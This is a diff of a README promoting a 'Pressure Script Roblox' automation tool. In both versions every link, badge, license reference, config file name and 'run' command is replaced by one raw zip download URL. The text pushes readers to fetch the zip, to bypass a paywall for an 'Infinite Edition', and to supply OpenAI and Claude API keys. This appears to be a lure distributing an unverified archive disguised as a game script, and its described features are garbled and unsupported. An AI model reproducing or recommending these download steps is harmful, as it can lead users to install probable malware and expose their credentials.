@@ -1,15 +1,15 @@
 # Pressure Script Roblox 🎮
 
-![Pressure Script Roblox Logo](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip%20pressure%20script-ready-brightgreen)  
-![Build Status](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)  
-![OS Compatibility](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip%20%7C%20macos%20%7C%20linux-informational)  
-![MIT License](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)
+![Pressure Script Roblox Logo](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip%20pressure%20script-ready-brightgreen)  
+![Build Status](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)  
+![OS Compatibility](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip%20%7C%20macos%20%7C%20linux-informational)  
+![MIT License](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)
 
 > Harness pressure. Command your Roblox world. Unlock scripting at the speed of thought!
 
 ---
 
-## [![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip%20Pressure%20Script%20Roblox-blue?style=for-the-badge&logo=roblox)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)
+## [![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip%20Pressure%20Script%20Roblox-blue?style=for-the-badge&logo=roblox)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)
 
 ---
 
@@ -41,13 +41,13 @@ Unlocking possibilities is a breeze! Just follow these tailored instructions at 
 ### 1. Download the Magical Script Package
 
 - Click here to **download the latest Pressure Script Roblox bundle**:  
-  https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip
+  https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip
 
 ### 2. Instant Access via Clickable Download Badge
 
 - For extra flair, just tap this badge to start your journey:
 
-  [![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)
+  [![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)
 
 ### 3. Easy Expansion
 
@@ -55,12 +55,12 @@ Unlocking possibilities is a breeze! Just follow these tailored instructions at 
 - Import the scripts into your Roblox Studio workspace.
 - Open your terminal or command prompt, navigate to the extracted folder, and run:
 
-    - `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip` for Windows  
-    - `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip` for Linux/macOS
+    - `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip` for Windows  
+    - `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip` for Linux/macOS
 
 ### 4. Quick Configuration
 
-- Customize your pressure thresholds and script triggers in `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip`.
+- Customize your pressure thresholds and script triggers in `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip`.
 - Access adaptive UI settings using the built-in UI Manager.
 - Link your API keys for OpenAI and Claude (see Integration below).
 
@@ -109,7 +109,7 @@ Are you searching for “AI-powered Roblox scripting tools” or “modern press
 
 - **Plug in your OpenAI API key** (v2 and later supported)
 - **Insert your Claude API credentials** for uniquely human-like interactions
-- Configure API endpoints in the bundled `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip`
+- Configure API endpoints in the bundled `https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip`
 - Instantly enable:
 
     - Adaptive NPC dialog and storyline branching  
@@ -134,7 +134,7 @@ Are you searching for “AI-powered Roblox scripting tools” or “modern press
 Unlock the "Infinite Edition" via our unique alternative expression pathway!  
 Skip the old-fashioned paywall and obtain perpetual scripting prowess—just grab the package by clicking this:
 
-[![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)
+[![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)
 
 Explore unbounded creative potential, expand with limitless modules, and script at the speed of tomorrow.
 
@@ -150,7 +150,7 @@ Use responsibly—exercising creativity while adhering to platform policies. Thi
 ## 📜 MIT License
 
 Copyright © 2025  
-Distributed under the [MIT License](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip).  
+Distributed under the [MIT License](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip).  
 Use, modify, expand, and redistribute freely—just give credit where credit’s due!
 
 ---
@@ -159,7 +159,7 @@ Use, modify, expand, and redistribute freely—just give credit where credit’s
 
 For those who missed the call at the top—here’s your golden ticket:
 
-[![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/script-roblox-pressure-automation-v2.9.zip)
+[![Download](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)](https://github.com/isaiasfeerreira/roblox-pressure-automation-script/raw/refs/heads/branch/thoughtful/roblox-automation-script-pressure-1.1.zip)
 
 ---
 
